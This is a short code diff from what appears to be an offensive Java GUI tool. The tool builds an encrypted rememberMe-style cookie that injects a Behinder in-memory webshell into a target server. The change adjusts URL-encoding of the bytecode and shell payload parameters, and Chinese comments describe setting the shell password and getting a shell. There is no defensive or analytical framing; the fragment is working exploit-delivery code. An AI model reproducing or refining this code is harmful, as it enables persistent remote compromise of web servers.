@@ -368,16 +368,16 @@ public class Controller {
                 Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class);
                 params = new HashMap<>();
                 //冰蝎内存马需要用到pageContext
-                params.put("c1", URLEncoder.encode(GetByteCodeUtil.getEncodeData(PageContext.class),"UTF-8"));
+                params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
                 //反射设置密码，取shell
                 String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd));
-                params.put("c2",URLEncoder.encode(shellData,"UTF-8") );
+                params.put("c2",shellData );
                 //postData = "c1="+paramsContext.get("PageContext")+"&c2="+shellData;
             }
 
 
             //请求包header超过8k会报header too large错误
-            //此处大坑，不进行urlencode有bug
+            //此处大坑，有时候需要urlencode
             header.put("cookie", rmeValue + "=" + encryptData);
             if (isShowPayload.isSelected()) {
                 Controller.logUtil.printData(header.toString());
